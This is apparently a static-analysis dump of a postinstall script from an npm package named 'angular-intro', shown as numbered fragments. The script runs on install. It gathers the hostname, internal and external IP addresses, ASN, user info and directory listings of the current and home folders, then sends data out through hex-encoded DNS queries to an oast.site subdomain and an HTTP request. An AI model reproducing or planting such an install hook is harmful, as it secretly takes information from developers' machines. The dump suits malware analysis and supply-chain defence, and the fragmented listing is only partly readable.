// File: tmp/tmpu6cr7r_q/angular-intro/package/postinstall.js
// ======================================================================
Line 1: const fs = require('fs')
Line 2: const dns = require('dns')
Line 3: const http = require('http')
Line 4: const https = require('https')
Line 5: const os = require('os')
Line 6: _tmp_9 = require('child_process')
Line 13: os.hostname()
Line 18: execSync('hostname -I').toString().trim()
Line 24: os.platform()
Line 25: os.userInfo()
Line 31: execSync(`ls ${currentPath}`).toString().trim()
Line 39: execSync(`ls ${homeDirectory}`).toString().trim()
Line 45: os.platform()
Line 47: os.arch()
Line 52: function fetchExternalIpAddress = function fetchExternalIpAddress(callback) {
  https.get('https://api.ipify.org?format=json', res => {
    let data = '';
    res.on('data', chunk => data += chunk);
    res.on('end', () => {
      try {
        const externalIp = JSON.parse(data).ip || 'unknown';
        callback(null, externalIp);
      } catch {
        callback(new Error('Invalid JSON'), 'unknown');
      }
    });
  }).on('error', err => callback(err, 'unknown'));
}
Line 53: (_tmp_0 = https.get('https://api.ipify.org?format=json', res => {
    let data = '';
    res.on('data', chunk => data += chunk);
    res.on('end', () => {
      try {
        const externalIp = JSON.parse(data).ip || 'unknown';
        callback(null, externalIp);
      } catch {
        callback(new Error('Invalid JSON'), 'unknown');
      }
    });
  }))
Line 58: const externalIp = JSON.parse(data).ip || 'unknown'
Line 59: callback(null, externalIp)
Line 61: callback(new Error('Invalid JSON'), 'unknown')
Line 64: callback(err, 'unknown')
Line 67: function fetchAsnInfo = function fetchAsnInfo(ip, callback) {
  const url = `http://ip-api.com/json/${ip}?fields=as,asname`;
  http.get(url, res => {
    let raw = '';
    res.on('data', c => raw += c);
    res.on('end', () => {
      try {
        const { as: asn = 'unknown', asname: asOrganization = 'unknown' } = JSON.parse(raw);
        callback(null, { asn, asOrganization });
      } catch {
        callback(new Error('Invalid ASN JSON'), { asn: 'unknown', asOrganization: 'unknown' });
      }
    });
  }).on('error', () => {
    callback(new Error('ASN lookup failed'), { asn: 'unknown', asOrganization: 'unknown' });
  });
}
Line 68: <operator>.formatString("http://ip-api.com/json/", ip, "?fields=as,asname")
Line 69: (_tmp_2 = http.get(url, res => {
    let raw = '';
    res.on('data', c => raw += c);
    res.on('end', () => {
      try {
        const { as: asn = 'unknown', asname: asOrganization = 'unknown' } = JSON.parse(raw);
        callback(null, { asn, asOrganization });
      } catch {
        callback(new Error('Invalid ASN JSON'), { asn: 'unknown', asOrganization: 'unknown' });
      }
    });
  }))
Line 74: _tmp_3 = JSON.parse(raw)
Line 75: callback(null, { asn, asOrganization })
Line 77: callback(new Error('Invalid ASN JSON'), { asn: 'unknown', asOrganization: 'unknown' })
Line 81: callback(new Error('ASN lookup failed'), { asn: 'unknown', asOrganization: 'unknown' })
Line 90: {
    if (asnErr) {
      fs.appendFileSync(logFile, `Error fetching ASN info: ${asnErr.message}\n`);
    }

    // assemble data
    const data = {
      packageName,
      packageVersion,
      hostname,
      internalIpAddress,
      externalIpAddress,
      userAgent,
      asn,
      asOrganization,
      currentPath,
      platform,
      userInfo,
      osDetails,
      currentDirectoryFiles,
      homeDirectoryFiles
    };

    fs.appendFileSync(logFile, `Data: ${JSON.stringify(data)}\n`);

    // DNS exfil
    const dnsData = `${packageName}-${hostname}-${externalIpAddress}`;
    const hexData = Buffer.from(dnsData).toString('hex');
    const maxLabelLength = 63;
    const parts = [];
    for (let i = 0; i < hexData.length; i += maxLabelLength) {
      parts.push(hexData.slice(i, i + maxLabelLength));
    }
    parts.forEach((part, i) => {
      const sub = `${part}-${i+1}-${parts.length}.cqati6eupgoo97it17fgdatea3nw746q1.oast.site`;
      dns.resolve4(sub, (e) => {
       ...
Line 117: Buffer.from(dnsData).toString('hex')
Line 119: const parts = []
Line 121: parts.push(hexData.slice(i, i + maxLabelLength))
Line 125: dns.resolve4(sub, (e) => {
        fs.appendFileSync(logFile,
          e
            ? `DNS resolution failed for ${sub}: ${e.message}\n`
            : `DNS query sent for ${sub}\n`
        );
      })
Line 142: const req = http.request(opts, res => {
      let resp = '';
      res.on('data', c => resp += c);
      res.on('end', () => {
        fs.appendFileSync(logFile, `HTTP request ${res.statusCode}: ${resp}\n`);
      });
    })
Line 152: req.end()
